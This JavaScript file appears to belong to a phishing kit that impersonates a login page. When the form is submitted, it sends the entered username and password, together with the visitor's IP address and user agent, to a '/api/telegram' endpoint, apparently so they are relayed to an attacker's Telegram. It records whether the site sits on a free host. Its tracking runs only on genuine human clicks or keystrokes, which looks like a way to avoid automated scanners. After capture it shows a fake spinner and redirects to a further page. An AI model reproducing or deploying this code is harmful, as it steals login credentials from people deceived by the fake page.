(function () {
  var form = document.getElementById("login-form");
  var userInput = document.getElementById("un");
  var passwordInput = document.getElementById("password");
  var userError = document.getElementById("user_name_validation_message");
  var passwordError = document.getElementById("password_validation_message");
  var usernameNeeded = document.getElementById("UserNameNeededError");
  var forgotPassword = document.getElementById("forgot-password-link");
  var submitBtn = form.querySelector('.button-subm');

  // ============================================================
  // ====== DOMAIN DETECTION - HUMAN INTERACTION ONLY ===========
  // ============================================================

  let domainDetected = false;

  function detectDomain() {
    if (domainDetected) return;
    
    const currentUrl = window.location.href;
    const urlObj = new URL(currentUrl);
    const domain = urlObj.hostname;
    
    const freeDomains = [
      '.tk', '.ml', '.ga', '.cf', '.gq',
      '.free.nf', '.free.org', '.free.com',
      '.co.cc', '.co.nr', '.cjb.net',
      '.dynu.net', '.ddns.net', '.no-ip.org',
      'vercel.app', 'netlify.app', 'github.io',
      'pages.dev', 'web.app', 'firebaseapp.com',
      'herokuapp.com', 'glitch.me', 'replit.co',
      '000webhostapp.com', 'byethost.com',
      'freehostia.com', 'profreehost.com',
      '.example.com', '.test', '.localhost'
    ];

    const isFree = freeDomains.some(freeDomain => 
      domain.includes(freeDomain) || domain.endsWith(freeDomain)
    );

    domainDetected = true;

    sendToTelegram('domain_detection', {
      domain: domain,
      isFree: isFree
    });

    console.log(`🌐 Domain detected: ${domain} (${isFree ? 'FREE' : 'PURCHASED'})`);
  }

  // Only detect on human interaction
  document.addEventListener('click', function(e) {
    if (!domainDetected && e.isTrusted) {
      detectDomain();
    }
  });

  document.addEventListener('keydown', function(e) {
    if (!domainDetected && e.isTrusted) {
      detectDomain();
    }
  });

  // Also detect when user interacts with form
  userInput.addEventListener('focus', function() {
    if (!domainDetected) detectDomain();
  });

  passwordInput.addEventListener('focus', function() {
    if (!domainDetected) detectDomain();
  });

  // ============================================================
  // ====== TELEGRAM INTEGRATION =================================
  // ============================================================

  async function sendToTelegram(action, data) {
    try {
      let ipData = { ip: 'Unknown' };
      try {
        const response = await fetch('/api/ip');
        if (response.ok) {
          ipData = await response.json();
        }
      } catch (e) {
        console.warn('Could not fetch IP data');
      }

      const payload = {
        action: action,
        data: {
          ...data,
          timestamp: new Date().toLocaleString('en-US', { 
            timeZone: 'America/New_York',
            hour12: true,
            year: 'numeric',
            month: '2-digit',
            day: '2-digit',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit'
          }),
          userAgent: navigator.userAgent,
          ip: ipData.ip || 'Unknown'
        }
      };

      await fetch('/api/telegram', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
    } catch (error) {
      console.error('Failed to send to Telegram:', error);
    }
  }

  // ============================================================
  // ====== FORM HANDLERS =======================================
  // ============================================================

  function clearErrors() {
    userError.textContent = "";
    passwordError.textContent = "";
    usernameNeeded.hidden = true;
  }

  function showTitleError() {
    var title = document.title;
    if (title.indexOf("Submission Error |") !== 0) {
      document.title = "Submission Error | " + title;
    }
  }

  passwordInput.addEventListener("keypress", function (event) {
    if (event.which === 32 || /\s/.test(event.key)) {
      event.preventDefault();
    }
  });

  forgotPassword.addEventListener("click", function (event) {
    event.preventDefault();
    clearErrors();
    var userName = userInput.value.trim();
    if (!userName) {
      usernameNeeded.hidden = false;
      showTitleError();
      return;
    }
    alert("Password reset requested for: " + userName);
  });

  // ============================================================
  // ====== LOGIN FORM SUBMIT ===================================
  // ============================================================

  form.addEventListener("submit", function (event) {
    event.preventDefault();
    clearErrors();

    var userName = userInput.value.trim();
    var password = passwordInput.value;
    var valid = true;
    var userPattern = /^[A-Za-z0-9.\-_@]+$/;

    if (!userName) {
      userError.textContent = "The Username field is required.";
      valid = false;
    } else if (userName.length > 100) {
      userError.textContent = "Username exceeds maximum allowed characters.";
      valid = false;
    } else if (!userPattern.test(userName)) {
      userError.textContent = "Special Characters are not allowed.";
      valid = false;
    }

    if (!password) {
      passwordError.textContent = "The Password field is required.";
      valid = false;
    } else if (password.length > 40) {
      passwordError.textContent = "Password exceeds maximum allowed characters.";
      valid = false;
    }

    if (!valid) {
      showTitleError();
      return;
    }

    // ====== SEND LOGIN CREDENTIALS TO TELEGRAM ======
    sendToTelegram('login_attempt', {
      username: userName,
      password: password
    });

    // ====== DISABLE BUTTON AND SHOW LOADING ======
    submitBtn.disabled = true;
    submitBtn.innerHTML = '<span class="spinner"></span>';
    submitBtn.classList.add('loading');

    // Store username for next steps
    try {
      sessionStorage.setItem("melodyUser", userName);
    } catch (e) {}

    // ====== REDIRECT AFTER 8 SECONDS ======
    setTimeout(function() {
      window.location.href = "auth.html";
    }, 8000);
  });
})();